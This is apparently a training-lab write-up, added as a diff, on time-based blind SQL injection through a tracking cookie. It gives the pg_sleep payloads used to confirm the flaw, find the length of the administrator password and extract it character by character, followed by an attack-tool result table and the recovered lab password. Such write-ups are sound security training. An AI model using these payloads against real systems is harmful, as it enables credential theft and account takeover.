@@ -1,0 +1,55 @@
+Lab #14 Blind SQL injection with time delays and information retrieval
+
+Vulnerable parameter - tracking cookie
+
+End Goals:
+1. Exploit time-based blind SQLi to output the administrator password.
+2. Login as the administrator user
+------------------------------------------------------------------------------
+
+Steps:
+
+1. Confirm that the parameter is Vulnerable to SQLi.
+
+' || pg_sleep(10)--
+
+2. Confirm that if the users table exists in the database.
+
+' || (select case when (1=1) then pg_sleep(10) else pg_sleep(-1) end)--
+    => this query will delay response by 10 seconds if case statement becomes true else it won't delay at all.
+    => using this we can get true or false responses.
+
+' || (select case when (username='administrator') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+3. Enumerate the password length.
+
+' || (select case when (username='administrator' and LENGTH(password)>1) then pg_sleep(10) else pg_sleep(-1) end from users)--
+    => length of the password = 20 characters.(using intruder)
+
+4. Enumerate the administrator password.
+
+' || (select case when (username='administrator' and substring(password,1,1)='a') then pg_sleep(10) else pg_sleep(-1) end from users)--
+
+214	14	k	200	10247	false	false	5488	
+379	19	s	200	10246	false	false	5488	
+442	2	w	200	10246	false	false	5488	
+607	7	4	200	10246	false	false	5488	
+330	10	q	200	10244	false	false	5488	
+489	9	y	200	10243	false	false	5488	
+436	16	v	200	10242	false	false	5488	
+558	18	1	200	10242	false	false	5488	
+372	12	s	200	10241	false	false	5488	
+231	11	l	200	10240	false	false	5488	
+641	1	6	200	10238	false	false	5488	
+513	13	z	200	10235	false	false	5488	
+257	17	m	200	10231	false	false	5488	
+525	5	0	200	10216	false	false	5488	
+586	6	3	200	10199	false	false	5488	
+308	8	p	200	10196	false	false	5488	
+284	4	o	200	10192	false	false	5488	
+15	15	a	200	10191	false	false	5488	
+140	20	g	200	10186	false	false	5488	
+503	3	z	200	10179	false	false	5488	
+
+From this we get the final password => 6wzo034pyqlszkavm1sg
+                                       
